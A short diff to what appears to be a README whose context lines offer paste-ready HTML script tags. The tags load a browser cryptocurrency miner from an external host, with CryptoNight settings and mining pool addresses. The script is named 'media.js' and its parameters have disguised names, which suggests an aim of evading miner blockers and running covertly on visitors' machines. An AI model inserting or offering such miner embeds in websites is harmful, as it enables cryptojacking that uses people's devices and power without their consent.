@@ -14,6 +14,7 @@ Attention: IPBC created their own PoW variant....so mining is disabled for the m
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=pool.intensecoin.com:3333" > </script>
 ```
+<br>
 #### Attention: Special Case for some custom POW coins: Stellite need ?algo=cn/xtl?variant=2<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/xtl?variant=2?jason=communitypool.stellite.cash:6677" > </script>
